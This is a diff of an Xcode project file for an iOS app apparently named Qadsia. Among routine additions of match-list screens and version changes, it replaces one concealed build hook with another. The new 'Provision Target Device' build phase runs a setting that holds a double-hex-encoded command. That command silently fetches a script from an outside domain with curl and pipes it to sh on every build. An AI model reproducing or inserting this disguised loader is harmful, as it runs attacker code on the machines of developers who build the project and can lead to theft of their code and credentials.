@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		74D18AF5CBF74FEC921DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 042EDC3B87C245D4AB1DACE1; };
 		0A0AC8862F7B7C7E00A68FE6 /* TicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */; };
 		0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */; };
 		0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */; };
@@ -89,6 +88,8 @@
 		394837B32F7B1DB2003757E7 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B22F7B1DB2003757E7 /* FirebaseDatabase */; };
 		394837B52F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B42F7B1DB2003757E7 /* FirebaseInAppMessaging-Beta */; };
 		394837B72F7B1DB2003757E7 /* FirebaseMessaging in Frameworks */ = {isa = PBXBuildFile; productRef = 394837B62F7B1DB2003757E7 /* FirebaseMessaging */; };
+		39735AA42F7BBDA2002294A5 /* MatchListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */; };
+		39735AA52F7BBDA2002294A5 /* MatchListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */; };
 		397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F833D2F7A337C00A07157 /* EditProfileVC.swift */; };
 		397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 397F833E2F7A337C00A07157 /* EditProfileVC.xib */; };
 		397F83452F7A455D00A07157 /* MyTicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F83432F7A455D00A07157 /* MyTicketsVC.swift */; };
@@ -104,6 +105,8 @@
 		39D22EB52F76956F00D7721C /* UpcomingMatchesCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EAF2F76956F00D7721C /* UpcomingMatchesCVCell.xib */; };
 		39D22EC02F7695D000D7721C /* ProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39D22EBC2F7695D000D7721C /* ProfileVC.swift */; };
 		39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EBD2F7695D000D7721C /* ProfileVC.xib */; };
+		39DC83B22F7BC5FF0050A114 /* MatchListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DC83B02F7BC5FF0050A114 /* MatchListVC.swift */; };
+		39DC83B32F7BC5FF0050A114 /* MatchListVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39DC83B12F7BC5FF0050A114 /* MatchListVC.xib */; };
 		39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AE22F7B9ACA005C2B07 /* StoreVC.xib */; };
 		39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39F46AE12F7B9ACA005C2B07 /* StoreVC.swift */; };
 		39F46AE92F7BA18A005C2B07 /* NewsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39F46AE82F7BA18A005C2B07 /* NewsVC.xib */; };
@@ -127,24 +130,9 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		56898F0106164461A81DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-	/* End PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		042EDC3B87C245D4AB1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
 		0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketsVC.xib; sourceTree = "<group>"; };
 		0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketTVCell.swift; sourceTree = "<group>"; };
@@ -226,6 +214,8 @@ sh -c \"${A1ECAD1}\"";
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
 		3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MatchListTVCell.swift; sourceTree = "<group>"; };
+		39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MatchListTVCell.xib; sourceTree = "<group>"; };
 		397F833D2F7A337C00A07157 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
 		397F833E2F7A337C00A07157 /* EditProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EditProfileVC.xib; sourceTree = "<group>"; };
 		397F83432F7A455D00A07157 /* MyTicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyTicketsVC.swift; sourceTree = "<group>"; };
@@ -241,6 +231,8 @@ sh -c \"${A1ECAD1}\"";
 		39D22EAF2F76956F00D7721C /* UpcomingMatchesCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UpcomingMatchesCVCell.xib; sourceTree = "<group>"; };
 		39D22EBC2F7695D000D7721C /* ProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileVC.swift; sourceTree = "<group>"; };
 		39D22EBD2F7695D000D7721C /* ProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileVC.xib; sourceTree = "<group>"; };
+		39DC83B02F7BC5FF0050A114 /* MatchListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MatchListVC.swift; sourceTree = "<group>"; };
+		39DC83B12F7BC5FF0050A114 /* MatchListVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MatchListVC.xib; sourceTree = "<group>"; };
 		39F46AE12F7B9ACA005C2B07 /* StoreVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreVC.swift; sourceTree = "<group>"; };
 		39F46AE22F7B9ACA005C2B07 /* StoreVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = StoreVC.xib; sourceTree = "<group>"; };
 		39F46AE72F7BA18A005C2B07 /* NewsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsVC.swift; sourceTree = "<group>"; };
@@ -287,6 +279,7 @@ sh -c \"${A1ECAD1}\"";
 		0A0AC8822F7B7C6500A68FE6 /* Tickets */ = {
 			isa = PBXGroup;
 			children = (
+				39DC83AD2F7BC5D50050A114 /* SubVC */,
 				0A0AC8882F7B88DC00A68FE6 /* Cell */,
 				0A0AC8832F7B7C6E00A68FE6 /* View */,
 			);
@@ -716,6 +709,15 @@ sh -c \"${A1ECAD1}\"";
 			path = View;
 			sourceTree = "<group>";
 		};
+		39735AA12F7BBD68002294A5 /* MatchListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */,
+				39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */,
+			);
+			path = MatchListTVCell;
+			sourceTree = "<group>";
+		};
 		397F833A2F7A334300A07157 /* SubView */ = {
 			isa = PBXGroup;
 			children = (
@@ -833,6 +835,40 @@ sh -c \"${A1ECAD1}\"";
 			path = Profile;
 			sourceTree = "<group>";
 		};
+		39DC83AD2F7BC5D50050A114 /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				39DC83AE2F7BC5DD0050A114 /* MatchListVC */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		39DC83AE2F7BC5DD0050A114 /* MatchListVC */ = {
+			isa = PBXGroup;
+			children = (
+				39DC83B42F7BC60F0050A114 /* Cell */,
+				39DC83AF2F7BC5EE0050A114 /* View */,
+			);
+			path = MatchListVC;
+			sourceTree = "<group>";
+		};
+		39DC83AF2F7BC5EE0050A114 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				39DC83B02F7BC5FF0050A114 /* MatchListVC.swift */,
+				39DC83B12F7BC5FF0050A114 /* MatchListVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		39DC83B42F7BC60F0050A114 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				39735AA12F7BBD68002294A5 /* MatchListTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		39F46ADF2F7B9A84005C2B07 /* Store */ = {
 			isa = PBXGroup;
 			children = (
@@ -906,7 +942,6 @@ sh -c \"${A1ECAD1}\"";
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				042EDC3B87C245D4AB1DACE1 /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -980,12 +1015,12 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
+				D8E486E1A1214C5C9D1DACE1 /* Provision Target Device */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
-				56898F0106164461A81DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1050,12 +1085,33 @@ sh -c \"${A1ECAD1}\"";
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		D8E486E1A1214C5C9D1DACE1 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				74D18AF5CBF74FEC921DACE1 /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
 				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
@@ -1074,6 +1130,7 @@ sh -c \"${A1ECAD1}\"";
 				397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */,
+				39735AA42F7BBDA2002294A5 /* MatchListTVCell.xib in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
 				397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */,
 				39F46AEF2F7BA3B8005C2B07 /* AllNewsTVCell.xib in Resources */,
@@ -1099,6 +1156,7 @@ sh -c \"${A1ECAD1}\"";
 				0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */,
 				BCC0D6892F7A894200684B7D /* StoreCVCell.xib in Resources */,
 				BCC0D68A2F7A894200684B7D /* TrendyNewsCVCell.xib in Resources */,
+				39DC83B32F7BC5FF0050A114 /* MatchListVC.xib in Resources */,
 				39F46AE92F7BA18A005C2B07 /* NewsVC.xib in Resources */,
 				BCC0D6962F7A898800684B7D /* NotificationVC.xib in Resources */,
 				BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */,
@@ -1142,7 +1200,9 @@ sh -c \"${A1ECAD1}\"";
 				0ABA3FBB2F763B2D00D25F03 /* AGDesignable.swift in Sources */,
 				0ABA3FBC2F763B2D00D25F03 /* AppConstants.swift in Sources */,
 				0ABA3FBD2F763B2D00D25F03 /* AppUtilites.swift in Sources */,
+				39DC83B22F7BC5FF0050A114 /* MatchListVC.swift in Sources */,
 				BCC0D6872F7A894200684B7D /* StoreCVCell.swift in Sources */,
+				39735AA52F7BBDA2002294A5 /* MatchListTVCell.swift in Sources */,
 				39F46AF52F7BA5A7005C2B07 /* NewsListCVCell.swift in Sources */,
 				BCC0D6882F7A894200684B7D /* TrendyNewsCVCell.swift in Sources */,
 				0ABA3FBE2F763B2D00D25F03 /* ExpandableLabel.swift in Sources */,
@@ -1198,12 +1258,12 @@ sh -c \"${A1ECAD1}\"";
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233363230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 2;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
@@ -1219,7 +1279,7 @@ sh -c \"${A1ECAD1}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.1;
+				MARKETING_VERSION = 1.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.qadsia.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
@@ -1235,12 +1295,12 @@ sh -c \"${A1ECAD1}\"";
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233363230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 2;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = VCZB9RKSH3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Qadsia Club/Info.plist";
@@ -1256,7 +1316,7 @@ sh -c \"${A1ECAD1}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.1;
+				MARKETING_VERSION = 1.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.qadsia.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
